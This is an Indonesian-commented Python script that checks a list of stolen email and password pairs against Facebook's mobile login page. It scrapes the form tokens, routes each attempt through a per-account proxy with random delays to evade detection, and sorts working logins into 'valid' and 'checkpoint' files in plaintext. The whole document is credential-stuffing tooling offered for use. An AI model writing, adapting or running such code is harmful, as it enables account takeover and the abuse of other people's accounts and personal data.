import requests
import json
from bs4 import BeautifulSoup
import time
import random
import logging
import traceback # Import modul traceback

# Konfigurasi logging
logging.basicConfig(filename='akun_checker.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def ambil_token(session, url, proxy=None): # Tambahkan parameter proxy
    """Mengambil token lsd dan jazoest dari halaman login."""
    try:
        res = session.get(url, proxies=proxy) # Gunakan proxy jika diberikan
        res.raise_for_status()
        soup = BeautifulSoup(res.text, 'html.parser')
        lsd = soup.find('input', {'name': 'lsd'})['value']
        jazoest = soup.find('input', {'name': 'jazoest'})['value']
        return lsd, jazoest
    except requests.exceptions.RequestException as e:
        logging.error(f"Gagal mengambil token: {e}")
        return None, None
    except (TypeError, KeyError) as e:
        logging.error(f"Gagal parsing HTML: {e}\n{traceback.format_exc()}") # Tambahkan traceback
        return None, None

def login_facebook(session, url, email, password, lsd, jazoest, proxy=None): # Tambahkan parameter proxy
    """Mencoba login ke Facebook dan mengembalikan respons."""

    payload = {
        'lsd': lsd,
        'jazoest': jazoest,
        'email': email,
        'pass': password,
        'login': 'Log In'
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Referer': url
    }

    try:
        r = session.post(url, data=payload, headers=headers, allow_redirects=True, proxies=proxy) # Gunakan proxy jika diberikan
        r.raise_for_status()
        return r
    except requests.exceptions.RequestException as e:
        logging.error(f"Gagal login untuk {email}: {e}\n{traceback.format_exc()}") # Tambahkan traceback
        return None

def cek_status_akun(response, email):
    """Menganalisis respons login untuk menentukan status akun."""

    if not response:
        return 'gagal'

    if 'save-device' in response.url or 'm_sess' in response.url or 'home.php' in response.url:
        logging.info(f"[VALID] {email}: Login berhasil (URL)")
        return 'valid'
    elif 'checkpoint' in response.url:
        if 'Masukkan kode' in response.text or 'Kami perlu mengonfirmasi identitas Anda' in response.text:
            logging.warning(f"[CHECKPOINT] {email}: Checkpoint terdeteksi (URL & Konten)")
            return 'checkpoint'
        else:
            logging.warning(f"[CHECKPOINT?] {email}: Checkpoint mungkin (URL)")
            return 'checkpoint?'
    elif 'login_attempt' in response.url:
        logging.warning(f"[INVALID] {email}: Login gagal (URL)")
        return 'invalid'
    else:
        if 'Kata sandi yang Anda masukkan salah' in response.text or 'The password you entered is incorrect' in response.text:
            logging.warning(f"[INVALID] {email}: Login gagal (Konten)")
            return 'invalid'
        else:
            logging.warning(f"[UNKNOWN] {email}: Status tidak diketahui (Perlu pemeriksaan manual)")
            return 'unknown'

def main():
    """Memproses daftar akun dan memeriksa statusnya."""

    with open('output.json', 'r') as f:
        akun_list = json.load(f)

    # Buka file log hasil
    f_valid = open("valid.txt", "a")
    f_checkpoint = open("checkpoint.txt", "a")
    f_invalid = open("invalid.txt", "a")
    f_unknown = open("unknown.txt", "a")
    f_failed = open("failed.txt", "a")

    session = requests.Session()
    url = 'https://mbasic.facebook.com/login'

    lsd, jazoest = ambil_token(session, url)
    if not lsd or not jazoest:
        logging.error("Gagal mendapatkan token awal. Skrip berhenti.")
        return

    for akun in akun_list:
        email = akun['data_account']['email']
        password = akun['data_account']['password']
        ip_address = akun['data_account']['ip_address']

        # Tambahkan jeda waktu acak
        time.sleep(random.uniform(1, 5))

        # Konfigurasi proxy menggunakan alamat IP dari file JSON
        proxy = {
            'http': f'http://{ip_address}:80',  # Ganti 80 dengan port proxy yang sesuai jika perlu
            'https': f'https://{ip_address}:443', # Ganti 443 dengan port yang sesuai
        }
        #penting : Port di atas adalah contoh umum. Anda mungkin perlu mengubahnya tergantung pada pengaturan proxy Anda. Port 80 untuk HTTP dan 443 untuk HTTPS adalah default, tetapi banyak proxy menggunakan port lain. Tanyakan kepada penyedia proxy Anda port mana yang harus digunakan.

        response = login_facebook(session, url, email, password, lsd, jazoest, proxy) # Gunakan proxy
        status = cek_status_akun(response, email)

        line = f"{email} | {password} | {ip_address}\n"

        if status == 'valid':
            print(f"[VALID] {line.strip()}")
            f_valid.write(line)
        elif status == 'checkpoint' or status == 'checkpoint?':
            print(f"[CHECKPOINT] {line.strip()}")
            f_checkpoint.write(line)
        elif status == 'invalid':
            print(f"[INVALID] {line.strip()}")
            f_invalid.write(line)
        elif status == 'unknown':
            print(f"[UNKNOWN] {line.strip()}")
            f_unknown.write(line)
        else:
            print(f"[FAILED] {line.strip()}")
            f_failed.write(line)

        # Perbarui token secara berkala (opsional, tapi sangat disarankan jika Anda menggunakan proxy yang berbeda per akun)
        if random.random() < 0.1:
            lsd, jazoest = ambil_token(session, url, proxy) #gunakan proxy saat ambil token
            if not lsd or not jazoest:
                logging.warning("Gagal memperbarui token. Mungkin terus menggunakan token lama.")

    # Tutup file log
    f_valid.close()
    f_checkpoint.close()
    f_invalid.close()
    f_unknown.close()
    f_failed.close()

if _name_ == "_main_":
    main()